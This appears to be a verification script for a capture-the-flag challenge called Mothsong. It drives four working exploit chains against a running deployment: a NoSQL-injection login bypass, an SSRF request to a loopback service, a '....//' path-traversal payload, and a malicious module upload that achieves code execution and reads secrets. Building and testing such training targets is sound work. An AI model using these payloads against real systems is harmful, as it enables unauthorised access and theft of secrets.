'use strict';

/**
 * End-to-end exploit verifier.
 *
 *   BASE_URL=https://mothsong-api.onrender.com node scripts/verify.js
 *
 * Drives all four exploit chains against a RUNNING deployment and reports pass/fail so
 * the operator can confirm the box is armed before sending it to participants.
 *
 * Env:
 *   BASE_URL       public backend base URL       (default http://localhost:4000)
 *   INTERNAL_PORT  loopback port of the private   (default 8000)
 *                  microservice, as seen by the
 *                  backend host (this is the SSRF target)
 *
 * If backend/data/flags.json is present locally AND matches the deployment's seed, the
 * leaked values are asserted for exact equality. Otherwise the script still verifies
 * each exploit path works and that a well-formed MOTHSONG{...} flag comes back.
 */

const fs = require('fs');
const path = require('path');

const BASE = (process.env.BASE_URL || 'http://localhost:4000').replace(/\/$/, '');
const INTERNAL_PORT = Number(process.env.INTERNAL_PORT) || 8000;

let expected = null;
try {
  expected = JSON.parse(
    fs.readFileSync(path.join(__dirname, '..', 'data', 'flags.json'), 'utf8')
  );
} catch (_e) {
  /* no local flags — fall back to format checks */
}

const FLAG_RE = /MOTHSONG\{[^}]+\}/;
const results = [];
function record(name, ok, detail) {
  results.push({ name, ok, detail });
  const tag = ok ? '\x1b[32mPASS\x1b[0m' : '\x1b[31mFAIL\x1b[0m';
  console.log(`  [${tag}] ${name}${detail ? ' — ' + detail : ''}`);
}
function extractFlag(text) {
  const m = String(text).match(FLAG_RE);
  return m ? m[0] : null;
}
function check(flag, key) {
  if (!flag) return { ok: false, detail: 'no flag found in response' };
  if (expected && expected[key] && flag !== expected[key]) {
    return { ok: false, detail: `flag mismatch (got ${flag})` };
  }
  return { ok: true, detail: flag };
}

async function main() {
  console.log(`\nMothsong exploit verification → ${BASE}\n`);

  // ── Chain 1: NoSQL injection → auth bypass ────────────────────────────────
  let token = null;
  try {
    const r = await fetch(`${BASE}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'admin', password: { $ne: null } }),
    });
    const j = await r.json();
    token = j.token;
    const flag = j.user && extractFlag(j.user.secretNote || '');
    const v = check(flag, 'auth');
    record('#1 NoSQL auth bypass', r.ok && !!token && v.ok, v.detail);
  } catch (e) {
    record('#1 NoSQL auth bypass', false, e.message);
  }

  if (!token) {
    console.log('\n  Cannot continue without a session token from chain #1.\n');
    return finish();
  }
  const auth = { Authorization: `Bearer ${token}` };

  // ── Chain 2: SSRF → read the private microservice ─────────────────────────
  try {
    // default SSRF payload: loopback + the common 8000 port, served at the root
    const internalUrl = `http://127.0.0.1:${INTERNAL_PORT}/`;
    const r = await fetch(`${BASE}/api/profile/avatar-import`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...auth },
      body: JSON.stringify({ url: internalUrl }),
    });
    const j = await r.json();
    const preview = j.debug && j.debug.bodyPreview ? j.debug.bodyPreview : JSON.stringify(j);
    const v = check(extractFlag(preview), 'ssrf');
    record('#2 SSRF → internal service', v.ok, v.detail);
  } catch (e) {
    record('#2 SSRF → internal service', false, e.message);
  }

  // ── Chain 3: LFI via the double-strip bypass ──────────────────────────────
  try {
    const payload = '....//....//....//....//var/www/html/flag_lfi.txt';
    const r = await fetch(`${BASE}/api/levels/asset?name=${encodeURIComponent(payload)}`);
    const text = await r.text();
    const v = check(extractFlag(text), 'lfi');
    record('#3 LFI path traversal', v.ok, v.detail);
  } catch (e) {
    record('#3 LFI path traversal', false, e.message);
  }

  // ── Chain 4: file upload → RCE ────────────────────────────────────────────
  try {
    const modCode =
      "// exploit mod: read the RCE flag from the server process\n" +
      "module.exports = process.env.FLAG_RCE || require('fs').readFileSync(__dirname + '/../data/flags.json','utf8');\n";
    const form = new FormData();
    form.append('mod', new Blob([modCode], { type: 'application/javascript' }), 'exploit.js');

    const up = await fetch(`${BASE}/api/mods/upload`, { method: 'POST', headers: auth, body: form });
    const upJson = await up.json();
    if (!upJson.file) throw new Error('upload did not return a filename');

    const run = await fetch(`${BASE}/api/mods/apply`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...auth },
      body: JSON.stringify({ file: upJson.file }),
    });
    const runJson = await run.json();
    const blob = extractFlag(runJson.result) || extractFlag((runJson.logs || []).join(' '));
    const v = check(blob, 'rce');
    record('#4 upload → RCE', v.ok, v.detail);
  } catch (e) {
    record('#4 upload → RCE', false, e.message);
  }

  return finish();
}

function finish() {
  const passed = results.filter((r) => r.ok).length;
  console.log(`\n${passed}/${results.length} chains passed.\n`);
  process.exit(passed === 4 ? 0 : 1);
}

main().catch((e) => {
  console.error('verify: unexpected error', e);
  process.exit(1);
});
